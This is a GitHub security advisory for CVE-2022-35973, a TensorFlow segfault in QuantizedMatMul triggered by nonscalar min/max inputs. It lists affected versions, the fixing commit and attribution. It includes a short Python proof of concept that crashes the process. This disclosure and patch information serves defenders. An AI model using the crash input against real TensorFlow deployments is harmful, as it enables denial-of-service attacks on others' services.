# [M] TensorFlow vulnerable to segfault in `QuantizedMatMul`

## Summary
Severity: Medium
Advisory: GHSA-689c-r7h2-fv9v
CVE: CVE-2022-35973
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-689c-r7h2-fv9v
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizedMatMul` is given nonscalar input for:
 - `min_a`
 - `max_a`
 - `min_b`
 - `max_b`
It gives a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

Toutput = tf.qint32
transpose_a = False
transpose_b = False
Tactivation = tf.quint8
a = tf.constant(7, shape=[3,4], dtype=tf.quint8)
b = tf.constant(1, shape=[2,3], dtype=tf.quint8)
min_a = tf.constant([], shape=[0], dtype=tf.float32)
max_a = tf.constant(0, shape=[1], dtype=tf.float32)
min_b = tf.constant(0, shape=[1], dtype=tf.float32)
max_b = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)
```

### Patches
We have patched the issue in GitHub commit [aca766ac7693bf29ed0df55ad6bfcc78f35e7f48](https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-689c-r7h2-fv9v
- https://nvd.nist.gov/vuln/detail/CVE-2022-35973
- https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
